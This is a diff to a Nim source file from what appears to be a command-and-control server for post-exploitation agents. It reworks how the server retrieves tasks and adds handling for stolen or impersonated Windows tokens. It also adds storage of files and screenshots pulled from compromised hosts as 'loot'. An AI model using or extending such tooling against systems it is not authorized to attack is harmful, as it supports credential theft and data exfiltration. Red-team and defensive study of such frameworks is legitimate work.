@@ -1,10 +1,9 @@
-import terminal, strformat, strutils, sequtils, tables, system, std/[dirs, paths]
+import terminal, strformat, strutils, sequtils, tables, os, times
+import std/[dirs, paths]
 
 import ../globals
 import ../db/database
-import ../protocol/packer
-import ../core/logger
-import ../websocket
+import ../core/[packer, logger, websocket]
 import ../../common/[types, utils, serialize]
 
 #[
@@ -48,38 +47,33 @@ proc getTasks*(heartbeat: seq[byte]): tuple[agentId: string, tasks: seq[seq[byte
 
     {.cast(gcsafe).}:
 
-        try:
-            # Deserialize checkin request to obtain agentId and listenerId 
-            let 
-                request: Heartbeat = cq.deserializeHeartbeat(heartbeat)
-                agentId = Uuid.toString(request.header.agentId)
-                listenerId = Uuid.toString(request.listenerId)
-                timestamp = request.timestamp
+        # Deserialize checkin request to obtain agentId and listenerId 
+        let 
+            request: Heartbeat = cq.deserializeHeartbeat(heartbeat)
+            agentId = Uuid.toString(request.header.agentId)
+            listenerId = Uuid.toString(request.listenerId)
+            timestamp = request.timestamp
 
-            var tasks: seq[seq[byte]]
+        var tasks: seq[seq[byte]]
 
-            # Check if listener exists
-            if not cq.dbListenerExists(listenerId): 
-                raise newException(ValueError, fmt"Task-retrieval request made to non-existent listener: {listenerId}." & "\n")
+        # Check if listener exists
+        if not cq.dbListenerExists(listenerId): 
+            raise newException(ValueError, fmt"Task-retrieval request made to non-existent listener: {listenerId}." & "\n")
 
-            # Check if agent exists
-            if not cq.dbAgentExists(agentId): 
-                raise newException(ValueError, fmt"Task-retrieval request made to non-existent agent: {agentId}." & "\n")
+        # Check if agent exists
+        if not cq.dbAgentExists(agentId): 
+            raise newException(ValueError, fmt"Task-retrieval request made to non-existent agent: {agentId}." & "\n")
 
-            # Update the last check-in date for the accessed agent
-            cq.agents[agentId].latestCheckin = cast[int64](timestamp)
-            cq.client.sendAgentCheckin(agentId)
+        # Update the last check-in date for the accessed agent
+        cq.agents[agentId].latestCheckin = cast[int64](timestamp)
+        cq.client.sendAgentCheckin(agentId)
 
-            # Return tasks
-            for task in cq.agents[agentId].tasks.mitems: # Iterate over agents as mutable items in order to modify GMAC tag
-                let taskData = cq.serializeTask(task)
-                tasks.add(taskData)
-            
-            return (agentId, tasks)
-
-        except CatchableError as err:
-            cq.error(err.msg) 
-            return ("", @[])
+        # Return tasks
+        for task in cq.agents[agentId].tasks.mitems: # Iterate over agents as mutable items in order to modify GMAC tag
+            let taskData = cq.serializeTask(task)
+            tasks.add(taskData)
+        
+        return (agentId, tasks)
 
 proc handleResult*(resultData: seq[byte]) = 
 
@@ -100,6 +94,20 @@ proc handleResult*(resultData: seq[byte]) =
                 cq.client.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Task {taskId} completed.")
                 cq.success(fmt"Task {taskId} completed.")
                 cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
+
+                # Handle additional actions or UI-events based on command type (only when command succeeded)
+                case cast[CommandType](taskResult.command):
+                of CMD_MAKE_TOKEN, CMD_STEAL_TOKEN: 
+                    let impersonationToken: string = Bytes.toString(taskResult.data).split(" ", 1)[1..^1].join(" ")[0..^2]   # Remove trailing '.' character from the domain\username string
+                    if cq.dbUpdateTokenImpersonation(agentId, impersonationToken):
+                        cq.agents[agentId].impersonationToken = impersonationToken
+                        cq.client.sendImpersonateToken(agentId, impersonationToken) 
+                of CMD_REV2SELF:
+                    if cq.dbUpdateTokenImpersonation(agentId, ""):
+                        cq.agents[agentId].impersonationToken.setLen(0)
+                        cq.client.sendRevertToken(agentId)
+                else: discard 
+
             of STATUS_FAILED: 
                 cq.client.sendConsoleItem(agentId, LOG_ERROR, fmt"Task {taskId} failed.")
                 cq.error(fmt"Task {taskId} failed.")
@@ -111,32 +119,44 @@ proc handleResult*(resultData: seq[byte]) =
             of RESULT_STRING:
                 if int(taskResult.length) > 0:
                     cq.client.sendConsoleItem(agentId, LOG_INFO, "Output:") 
-                    cq.info("Output:")
                     cq.client.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data))
-
-                    # Split result string on newline to keep formatting
-                    for line in Bytes.toString(taskResult.data).split("\n"):
-                        cq.output(line)
 
             of RESULT_BINARY:
                 # Write binary data to a file 
-                # A binary result packet consists of the filename and file contents, both prefixed with their respective lengths as a uint32 value, unless it is fragmented
+                # A binary result packet consists of the filename and file contents, both prefixed with their respective lengths as a uint32 value
                 var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
                 let 
                     fileName = unpacker.getDataWithLengthPrefix().replace("\\", "_").replace(":", "") # Replace path characters for better storage of downloaded files            
-                    fileBytes = unpacker.getDataWithLengthPrefix()
+                    fileData = unpacker.getDataWithLengthPrefix()
 
                 # Create loot directory for the agent
                 createDir(cast[Path](fmt"{CONQUEST_ROOT}/data/loot/{agentId}"))
                 let downloadPath = fmt"{CONQUEST_ROOT}/data/loot/{agentId}/{fileName}"
 
-                writeFile(downloadPath, fileBytes)
+                writeFile(downloadPath, fileData)
 
-                cq.success(fmt"File downloaded to {downloadPath} ({$fileBytes.len()} bytes).", "\n")
-                cq.client.sendConsoleItem(agentId, LOG_SUCCESS, fmt"File downloaded to {downloadPath} ({$fileBytes.len()} bytes).")
+                # Get file information
+                let fileInfo = getFileInfo(downloadPath)
+                var lootItem = LootItem(
+                    lootId: generateUuid(),
+                    itemType: parseEnum[LootItemType](($cast[CommandType](taskResult.command)).split("_")[1]), # CMD_DOWNLOAD -> DOWNLOAD, CMD_SCREENSHOT -> SCREENSHOT
+                    agentId: agentId, 
+                    path: downloadPath, 
+                    timestamp: fileInfo.creationTime.toUnix(),
+                    size: fileInfo.size, 
+                    host: cq.agents[agentId].hostname
+                )
 
-            of RESULT_NO_OUTPUT:
-                cq.output()
+                # Send loot to client to display file/screenshot in the UI
+                discard cq.dbStoreLoot(lootItem)
+                cq.client.sendLoot(lootItem)
+
+                cq.output(fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", "\n")
+                cq.client.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).")
+            else: discard 
+
+            # Send newline to separate commands
+            cq.client.sendConsoleItem(agentId, LOG_OUTPUT, "")
             
         except CatchableError as err:
             cq.error(err.msg, "\n")  
